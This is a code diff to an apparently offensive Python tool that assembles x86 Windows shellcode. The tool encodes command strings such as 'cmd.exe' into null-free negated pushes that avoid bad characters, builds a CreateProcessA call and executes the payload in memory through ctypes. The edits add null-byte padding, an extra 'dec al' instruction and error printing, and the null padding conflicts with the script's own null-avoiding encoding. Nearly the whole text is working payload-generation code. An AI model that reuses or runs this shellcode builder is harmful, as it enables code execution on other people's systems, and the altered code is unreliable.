@@ -53,9 +53,9 @@ def get_port_hex(port_num):
 def change_command_to_memory_hex (cmd, bad_char_list, verbose): 
     #Adding some spacers to clean the end of command for easier loading into memory
     if len(cmd) % 4 == 0:
-        cmd += '#'*3
+        cmd += '\0'*3
     else:
-        cmd += '#'*(3-(len(cmd)%4))
+        cmd += '\0'*(3-(len(cmd)%4))
     
     
     # Any text string that we want to execute has to be split into 4 byte chunks
@@ -290,6 +290,7 @@ def add_negated_value(cmd_hex, verbose):
     return (
         f"  mov   eax, 0x{packed_value.hex()};"  #   Move 0xff9a879b into EAX
         f"  neg   eax                       ;"  #   Negate EAX, EAX = 00657865
+        f"  dec   al                        ;"
         f"  push  eax                       ;"  #   Push part of the "cmd.exe" string
     )
 
@@ -327,6 +328,7 @@ def create_process_a(count):
         f"  inc   eax                       ;"  #   Increase EAX, EAX = 0x01 (TRUE)
         f"  push  eax                       ;"  #   Push bInheritHandles
         f"  dec   eax                       ;"  #   NULL EAX
+        
         f"  push  eax                       ;"  #   Push lpThreadAttributes
         f"  push  eax                       ;"  #   Push lpProcessAttributes
         f"  push  ebx                       ;"  #   Push lpCommandLine
@@ -356,5 +358,8 @@ def execute_shellcode(shellcode):
                                              ctypes.c_int(0),
                                              ctypes.c_int(0),
                                              ctypes.pointer(ctypes.c_int(0)))
+
+    op =ctypes.windll.kernel32.GetLastError()
+    print(op)
 
     ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
